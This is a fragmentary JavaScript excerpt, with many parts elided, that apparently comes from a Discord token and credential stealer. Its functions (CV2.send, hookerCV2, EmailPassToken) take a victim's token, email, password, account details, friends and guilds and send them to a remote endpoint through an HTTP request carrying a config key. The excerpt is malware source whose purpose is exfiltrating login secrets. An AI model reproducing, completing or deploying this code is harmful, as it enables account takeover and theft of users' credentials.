...
const CV2 = {
    ...
    send: (components, flags = 0) => {
        return new Promise((resolve, reject) => {
            ...
            req.on("error", reject);
            req.write(JSON.stringify({ key: CONFIG.key, flags: flags, components }));
            req.end();
        });
    }
};
...
const hookerCV2 = async (content, token, account) => {
    ...
    try {
        await CV2.send([accountContainer, CV2.separator(), friendsContainer, CV2.separator(), guildsContainer], account.flags || account.public_flags || 0);
    } catch (err) {
...
const EmailPassToken = async (email, password, token, action) => {
    ...
    await CV2.send([accountContainer], account.flags || account.public_flags || 0);
};
